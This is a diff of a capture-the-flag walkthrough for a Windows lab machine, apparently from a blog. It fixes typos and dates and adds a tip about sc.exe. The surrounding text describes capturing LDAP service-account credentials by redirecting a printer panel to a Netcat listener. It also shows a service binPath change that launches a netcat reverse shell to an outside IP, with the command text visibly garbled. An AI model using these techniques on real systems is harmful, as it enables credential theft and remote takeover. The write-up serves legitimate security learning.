@@ -1,6 +1,6 @@
 ---
 title: "Return Walkthrough: Exploiting Printer Misconfigurations"
-date: 2024-11-24 19:00:00 +0530
+date: 2024-11-08 19:00:00 +0530
 categories: [Capture the Flags, Windows]
 tags: [HTB,ldap,on-prem,privesc_backup]   
 description: "Walkthrough of HTB's Return machine"
@@ -63,7 +63,7 @@ No interesting information found in the UDP Scan results
 
 ### HTTP Recon
 
-Accessing port 80 displays a web page labeled 'HTB Printer Admin Panel.
+Accessing port 80 displays a web page labeled 'HTB Printer Admin Panel'.
 ![image.png](assets/img/Return/image%201.png)
 
 Most available sections, such as 'Fax' and 'Troubleshooting,' are static, but the 'Settings' page includes an intriguing form with fields for the server address, port, username, and password, as shown below.
@@ -81,6 +81,7 @@ Printers can use LDAP (Lightweight Directory Access Protocol) to query the Activ
 For this to work, the printer needs LDAP credentials (often a service account like svc-printer) to bind to AD and perform queries.
 
 I modified the IP address to point to my machine and set up a Netcat listener to intercept the data submitted by the form possibly revealing the password.
+
 ![image.png](assets/img/Return/image%204.png)
 
 The incoming request revealed interesting information, which indeed appears to be a password.
@@ -107,7 +108,7 @@ I attempted to log in to the machine using the compromised credentials, as shown
 Navigating to the Users directory reveals two users: svc-printer and Administrator
 ![image.png](assets/img/Return/image%205.png)
 
-Accessing "user.txt" on the svc-printer's desktop reveals fiest flag.
+Accessing "user.txt" on the svc-printer's desktop reveals first flag.
 
 ## Privilege Escation to SYSTEM
 
@@ -126,7 +127,7 @@ Followed by accessing root.txt
 
 ### Method - 2
 
-Since the user belongs to the "Server Operators" group, which has the ability to start and stop system services,  leveraged this privilege to gain a reverse shell. Using evil-winrm, we uploaded Netcat to the "Return" machine and modified the service configuration to execute a reverse shell command:
+Since the user belongs to the "Server Operators" group, which has the ability to start and stop system services,  leveraged this privilege to gain a reverse shell. Using evil-winrm, uploaded Netcat to the "Return" machine and modified the service configuration to execute a reverse shell command:
 
 ```bash
 *Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config vss binPath="C:[SC] ChangeServiceConfig SUCCESS4.exe -e cmd.exe 10.10.16.5 4444"
@@ -145,6 +146,8 @@ The service has not been started.
 
 The service did not respond to the start or control request in a timely fashion.
 ```
+
+> 💡 **Note**: When executing the command sc start vss, it is important to explicitly specify sc.exe for the command to work correctly. Simply using sc will not be sufficient.
 
 However, the obtained shell terminated after a few seconds. To resolve this issue, I proceeded to upload a Meterpreter shell for further exploitation.
 
